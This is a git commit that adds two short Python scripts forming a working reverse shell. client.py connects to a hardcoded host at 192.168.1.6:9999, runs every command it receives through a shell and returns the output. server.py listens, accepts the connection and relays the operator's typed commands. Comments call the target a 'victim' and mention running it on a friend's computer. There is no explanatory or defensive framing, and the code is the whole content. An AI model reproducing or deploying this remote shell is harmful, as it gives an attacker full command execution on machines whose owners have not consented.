06e3765d4bd640d993dabf0d30cc7f04b394ab96
Shubham Jha <sjha0090@gmail.com>
2021-10-08 12:46:05 +0530

    Add files via upload

---
+++ client.py
@@ -0,0 +1,31 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Sun Jun 14 15:06:30 2020
+
+@author: sumit
+"""
+
+import socket
+import os
+import subprocess
+
+s = socket.socket()
+host= "192.168.1.6"
+port = 9999
+s.connect((host,port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd': 
+        os.chdir(data[3:].decode("utf-8"))
+        
+    if len(data)>0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read()+cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd()+"> "
+        s.send(str.encode(output_str+currentWD))
+#        print(output_str)#for friends computer
+        
+        
+        
---
+++ server.py
@@ -0,0 +1,77 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Sun Jun 14 14:35:02 2020
+
+@author: sumit
+"""
+
+import socket
+import sys
+
+
+#to craete a socket(connect two computers)
+def create_socket():
+    try:
+        global host
+        global port 
+        global s #socket
+        host = ""
+        port = 9999
+        s = socket.socket()#socket created
+    except socket.error as msg:
+        print("socket creation error"+str(msg))
+    
+    
+# binding the socket and listening for coonections
+def bind_socket():
+    try:
+        global host
+        global port 
+        global s
+        print("Binding the ports "+ str(port))
+        
+        s.bind((host,port))
+        s.listen(5) #listen listen for the connection that can be made 
+        #5 is number of time it will tolerate bad connection before throwing error
+        
+    except socket.error as msg:
+        print("socket binding error"+ str(msg)+"\n"+"Retrying...")
+        bind_socket()
+        
+
+#establish connection with a client (socket must be listening)
+        
+def socket_accept():
+    conn, address = s.accept()
+    print("connection has been established |"+"IP"+address[0]+" |Port"+str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+#commands to victim    
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+            
+        if len(str.encode(cmd))>0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024),"utf-8")#when we send or recieve byte it always send in chunks. here our chunk will use 1024 bits
+            print(client_response, end="")
+            
+            
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+main()            
+
+        
+        
+ 
+        
+    
+    
